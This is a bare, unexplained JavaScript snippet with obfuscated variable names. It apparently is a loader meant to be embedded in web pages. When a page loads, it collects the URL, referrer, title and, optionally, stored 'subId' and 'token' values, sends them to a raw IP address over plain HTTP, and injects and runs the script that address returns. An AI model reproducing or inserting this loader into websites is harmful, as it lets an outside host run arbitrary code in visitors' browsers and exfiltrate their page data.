<script>
    (function() {
    var name = '_3msnz59cgtrSQccG';
    if (!window._3msnz59cgtrSQccG) {
        window._3msnz59cgtrSQccG = {
            unique: false,
            ttl: 86400,
            R_PATH: 'http://78.141.220.118/pJhktJ',
            P_PATH: 'http://78.141.220.118/79f10ac/postback',
        };
    }
    const _y3H4d2nv2WxfzcR2 = localStorage.getItem('config');
    if (typeof _y3H4d2nv2WxfzcR2 !== 'undefined' && _y3H4d2nv2WxfzcR2 !== null) {
        var _VMQBHZgnHPfPYvcF = JSON.parse(_y3H4d2nv2WxfzcR2);
        var _cG6Y1RX3vH6c3wzq = Math.round(+new Date()/1000);
        if (_VMQBHZgnHPfPYvcF.created_at + window._3msnz59cgtrSQccG.ttl < _cG6Y1RX3vH6c3wzq) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _1V3C9WF8DGd71YM4 = localStorage.getItem('subId');
    var _wfWnD7q27jWZtLK1 = localStorage.getItem('token');
    var _rVR1hJ5YjPt6XSvP = '?return=js.client';
        _rVR1hJ5YjPt6XSvP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _rVR1hJ5YjPt6XSvP += '&se_referrer=' + encodeURIComponent(document.referrer);
        _rVR1hJ5YjPt6XSvP += '&default_keyword=' + encodeURIComponent(document.title);
        _rVR1hJ5YjPt6XSvP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _rVR1hJ5YjPt6XSvP += '&name=' + encodeURIComponent(name);
        _rVR1hJ5YjPt6XSvP += '&host=' + encodeURIComponent(window._3msnz59cgtrSQccG.R_PATH);
    if (typeof _1V3C9WF8DGd71YM4 !== 'undefined' && _1V3C9WF8DGd71YM4 && window._3msnz59cgtrSQccG.unique) {
        _rVR1hJ5YjPt6XSvP += '&sub_id=' + encodeURIComponent(_1V3C9WF8DGd71YM4);
    }
    if (typeof _wfWnD7q27jWZtLK1 !== 'undefined' && _wfWnD7q27jWZtLK1 && window._3msnz59cgtrSQccG.unique) {
        _rVR1hJ5YjPt6XSvP += '&token=' + encodeURIComponent(_wfWnD7q27jWZtLK1);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._3msnz59cgtrSQccG.R_PATH + _rVR1hJ5YjPt6XSvP;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
